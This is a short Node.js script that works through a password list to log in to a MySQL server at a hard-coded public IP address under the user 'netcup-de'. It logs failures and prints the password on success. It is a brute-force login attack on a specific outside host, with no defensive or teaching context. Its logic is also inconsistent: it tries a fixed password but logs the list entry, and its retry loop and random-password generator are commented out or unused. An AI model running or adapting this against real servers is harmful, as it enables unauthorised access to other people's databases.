var mysql = require('mysql2');
var fs = require('fs');

var passwords = fs.readFileSync('passwords.txt').toString().split("\n");
console.log('Loaded passwords: ' + passwords.length)

function randomPassword() {
    var text = "";

    var charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!§$%&/()=?";

    for (var i = 0; i < 5; i++)
        text += charset.charAt(Math.floor(Math.random() * charset.length));

    return text;
}

var start = 66666

function connect() {

    //const password = randomPassword();

    var connection = mysql.createConnection({
        host: '156.59.100.115',
        user: 'netcup-de',
        password: 'netcup-de'
    });

    connection.connect(function (err) {
        if (err) {
            console.error('Failed with password:  ' + passwords[start] + ' at ' + start);
            start += 1;
            // connect();
            console.log(err)
            return;
        }

        console.log('connected as id ' + connection.threadId);
        console.log('Password: ' + passwords[start])
        return
    });
}

connect()
